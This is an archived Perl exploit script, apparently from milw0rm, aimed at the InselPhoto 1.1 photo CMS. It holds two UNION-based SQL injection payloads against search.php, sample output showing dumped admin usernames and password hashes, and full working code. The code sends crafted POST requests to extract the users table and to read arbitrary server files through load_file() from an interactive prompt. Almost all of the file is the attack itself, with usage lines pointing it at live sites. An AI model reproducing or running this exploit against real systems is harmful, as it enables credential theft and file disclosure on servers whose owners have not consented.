<html><head><title>InselPhoto 1.1 (query) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

# |----------------------------------------------------------------------------------------------------------------------------------|
# |                     INFORMATIONS                                                                                                 |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |Web Application :  InselPhoto v1.1                                                                                                |
# |Download        :  http://www.inselphoto.com/download.php?p=get_inselphoto                                                        |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |Remote Exploit (Admin credentials extract + File Disclosure via Sql Injection)                                                    |
# |by Osirys                                                                                                                         |
# |osirys[at]autistici[dot]org                                                                                                       |
# |osirys.org                                                                                                                        |
# |Greets to: evilsocket, Fireshot, Todd and str0ke                                                                                  |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |BUG [Sql Injection]
# |  Vulnerable file is: /[path]/search.php line 37
# |SQL Injections used by this sploit :
# |[1] ' union select 0,0,concat(username,0x3a,password),0,0,0,0,0 from inselphoto_users#
# |[2] ' union select 0,0,load_file('lf'),0,0,0,0,0#
# |----------------------------------------------------------------------------------------------------------------------------------|
# |This CMS is vulnerable to sql injection.This simple exploit just uses the sql bug to get admin credentials (username,password) and
# |uses load_file() mysql function to disclosure local file on the server.
# |This time no RCE exploit avaiable, becouse POST query is filtered with htmlentities, so will be impossible to write php code into
# |a file, for the fact that &lt; &gt; char will be html encoded.
# |----------------------------------------------------------------------------------------------------------------------------------|


# -----------------------------------------------------------------------------------------------------------------------------------|
# Exploit in action [&gt;!]
# -----------------------------------------------------------------------------------------------------------------------------------|
# osirys[~]&gt;$ perl sql2.txt http://localhost/InselPhoto/ admin_hash
#
#   -----------------------------------
#     InselPhoto SQL Injection Sploit
#             Coded by Osirys
#   -----------------------------------
#
# [*] Extracting users credentials ..
#
# [*] Username: admin
# [*] Password: 5f4dcc3b5aa765d61d8327deb882cf99
#
# [*] Username: osirys
# [*] Password: 6e1459df459890dfd8b4c3687c18abba
#
# [!] Succesfully Exploited !
#
# osirys[~]&gt;$
# -----------------------------------------------------------------------------------------------------------------------------------|
# osirys[~]&gt;$ perl sql2.txt http://localhost/InselPhoto/ file_disc
#
#   -----------------------------------
#     InselPhoto SQL Injection Sploit
#             Coded by Osirys
#   -----------------------------------
#
# [*] cat /home/osirys/test.txt
# Local file loaded :D
#
# [*] cat exit
# [-] Quitting ..
# osirys[~]&gt;$
# -----------------------------------------------------------------------------------------------------------------------------------|

use IO::Socket;

my $host   = $ARGV[0];
my $expl   = $ARGV[1];

my $sql_inj_path = &quot;/search.php&quot;;

($host,$expl) || help(&quot;-1&quot;);
cheek($host,$expl) == 1 || help(&quot;-2&quot;);
&amp;banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

&amp;adm_hash if $expl_way == 1;
&amp;file_discl if $expl_way == 2;

sub adm_hash {
    my $url = $path.$sql_inj_path;

    my $code=  &quot;query=%27+union+select+0%2C0%2Cconcat%28username%2C0x3a%2Cpassword%29%2C0%2C0%2C0%2C0%2C0+from+inselphoto_users%23&amp;type=photo&quot;;

    my $length = length($code);

    my $data = &quot;POST &quot;.$url.&quot; HTTP/1.1\r\n&quot;.
               &quot;Host: &quot;.$h0st.&quot;\r\n&quot;.
               &quot;Keep-Alive: 300\r\n&quot;.
               &quot;Connection: keep-alive\r\n&quot;.
               &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
               &quot;Content-Length: &quot;.$length.&quot;\r\n\r\n&quot;.
               $code.&quot;\r\n&quot;;

    my $socket   =  new IO::Socket::INET(
                                         PeerAddr =&gt; $h0st,
                                         PeerPort =&gt; '80',
                                         Proto    =&gt; 'tcp',
                                        ) or die &quot;[-] Can't connect to $h0st:80\n[?] $! \n\n&quot;;

    print &quot;[*] Extracting users credentials ..\n\n&quot;;
    $socket-&gt;send($data);

    while (my $e = &lt;$socket&gt;) {
        if ($e =~ /([a-zA-Z0-9-_.]{2,15}):([a-f0-9]{32})/) {
            $gotcha = 1;
            print &quot;[*] Username: $1\n&quot;;
            print &quot;[*] Password: $2\n\n&quot;;
        }
    }

    if ($gotcha != 1) {
        print &quot;[-] Can't extract users credentials\n[-] Exploit Failed !\n\n&quot;;
        exit(0);
    }

    print &quot;[!] Succesfully Exploited !\n\n&quot;;
    exit(0);
}

sub file_discl {
    my @outs;
    print &quot;[*] cat &quot;;
    my $file = &lt;STDIN&gt;;
    chomp($file);
    $file !~ /exit/ || die &quot;[-] Quitting ..\n&quot;;
    if ($file !~ /\/(.*)/) {
        print &quot;\n[-] Bad filename !\n&quot;;
        &amp;file_discl;
    }

    my $url = $path.$sql_inj_path;
    my $lfile = html($file);
    my $code=  &quot;query=%27+union+select+0%2C0%2Cload_file%28%27&quot;.$lfile.&quot;%27%29%2C0%2C0%2C0%2C0%2C0%23&amp;type=photo&quot;;

    my $length = length($code);

    my $data = &quot;POST &quot;.$url.&quot; HTTP/1.1\r\n&quot;.
               &quot;Host: &quot;.$h0st.&quot;\r\n&quot;.
               &quot;Keep-Alive: 300\r\n&quot;.
               &quot;Connection: keep-alive\r\n&quot;.
               &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
               &quot;Content-Length: &quot;.$length.&quot;\r\n\r\n&quot;.
               $code.&quot;\r\n&quot;;

    my $socket   =  new IO::Socket::INET(
                                         PeerAddr =&gt; $h0st,
                                         PeerPort =&gt; '80',
                                         Proto    =&gt; 'tcp',
                                        ) or die &quot;[-] Can't connect to $h0st:80\n[?] $! \n\n&quot;;

    $socket-&gt;send($data);

    while ((my $e = &lt;$socket&gt;)&amp;&amp;($stop != 1)) {
        if ($e =~ /\/0\/0' rel='lightbox\[insel\]/) {
            $stop = 1;
        }
        push(@outs,$e);
    }
    my $out = join '', @outs;
    my $content = tag($out);
    if ($content =~ /\$href='users\/\*\*(.+)\/0\/0'\$rel='lightbox\[insel\]/) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        $out =~ s/$out/$out\n/ if ($out !~ /\n$/);
        print &quot;$out\n&quot;;
        &amp;file_discl;
    }
    else {
        $c++;
        print &quot;[-] Can't find &quot;.$file.&quot; \n&quot;;
        $c &lt; 3 || die &quot;[-] File Disclosure failed !\n[-] Something wrong. Exploit Failed !\n\n&quot;;
        &amp;file_discl;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st.&quot; &quot;.$path;
    return $full_det;
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub html() {
    my $string = $_[0];
    $string =~ s/\//\%2F/g;
    $string =~ s/\\/\%5C/g;
    return($string);
}

sub cheek() {
    my $host  = $_[0];
    my $expl  = $_[1];
    if ($host =~ /http:\/\/(.*)/) {
        $ch_host = 1;
    }
    if ($expl =~ /admin_hash/) {
        $ch_expl = 1;
        $expl_way = 1;
    }
    elsif ($expl =~ /file_disc/) {
        $ch_expl = 1;
        $expl_way = 2;
    }
    return 1 if ((($ch_host)&amp;&amp;($ch_expl)) == 1);
    &amp;help(&quot;-2&quot;);
}

sub banner {
    print &quot;\n&quot;.
          &quot;  -----------------------------------\n&quot;.
          &quot;    InselPhoto SQL Injection Sploit  \n&quot;.
          &quot;            Coded by Osirys          \n&quot;.
          &quot;  -----------------------------------\n\n&quot;;
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &amp;banner;
        print &quot;\n[-] Input Error, missed some arguments !\n\n&quot;;
    }
    elsif ($error == -2) {
        &amp;banner;
        print &quot;\n[-] Bad arguments !\n\n&quot;;
    }
    print &quot;[*] Usage : perl $0 http://hostname/cms_path admin_hash\n&quot;;
    print &quot;    Ex:     perl $0 http://site.it/cms/      admin_hash\n&quot;;
    print &quot;[*] Usage : perl $0 http://hostname/cms_path file_disc\n&quot;;
    print &quot;    Ex:     perl $0 http://site.it/cms/      file_disc\n&quot;;
    exit(0);
}

# milw0rm.com [2009-02-11]</pre></html>